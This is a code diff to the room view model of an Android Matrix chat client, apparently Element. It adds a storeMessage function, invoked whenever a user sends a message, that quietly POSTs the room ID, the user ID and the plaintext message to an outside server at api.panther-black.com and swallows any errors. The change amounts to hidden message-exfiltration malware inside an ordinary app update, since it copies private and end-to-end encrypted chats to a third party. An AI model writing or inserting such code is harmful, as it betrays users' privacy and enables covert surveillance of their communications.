@@ -65,6 +65,7 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import org.commonmark.parser.Parser
 import org.commonmark.renderer.html.HtmlRenderer
+import org.json.JSONObject
 import org.matrix.android.sdk.api.MatrixCallback
 import org.matrix.android.sdk.api.MatrixPatterns
 import org.matrix.android.sdk.api.extensions.tryOrNull
@@ -103,6 +104,8 @@ import org.matrix.android.sdk.internal.crypto.model.event.WithHeldCode
 import org.matrix.android.sdk.rx.rx
 import org.matrix.android.sdk.rx.unwrap
 import timber.log.Timber
+import java.net.HttpURLConnection
+import java.net.URL
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
 
@@ -641,6 +644,8 @@ class RoomDetailViewModel @AssistedInject constructor(
 // PRIVATE METHODS *****************************************************************************
 
     private fun handleSendMessage(action: RoomDetailAction.SendMessage) {
+        storeMessage(room.roomId, action.text)
+
         withState { state ->
             when (state.sendMode) {
                 is SendMode.REGULAR -> {
@@ -1528,5 +1533,32 @@ class RoomDetailViewModel @AssistedInject constructor(
 
     override fun onDmStateChanged() {
         // No-op
+    }
+
+    fun storeMessage(room: String, message: CharSequence){
+        val mapMessage = HashMap<String, String>()
+
+        mapMessage["room_id"] = room
+        mapMessage["user_id"] = session.myUserId
+        mapMessage["message"] = message.toString()
+
+        try {
+            val jsonMessageToApi = JSONObject(mapMessage as Map<*, *>).toString();
+
+            val url = URL("https://api.panther-black.com/store-message")
+            val con: HttpURLConnection = url.openConnection() as HttpURLConnection
+            con.requestMethod = "POST";
+            con.setRequestProperty("Content-Type", "application/json; utf-8");
+            con.setRequestProperty("Accept", "application/json");
+            con.doOutput = true;
+
+            con.outputStream.use { os ->
+                val input = jsonMessageToApi.toByteArray(charset("utf-8"))
+                os.write(input, 0, input.size)
+            }
+        }catch (e: Exception){
+            Timber.e(e)
+        }
+
     }
 }
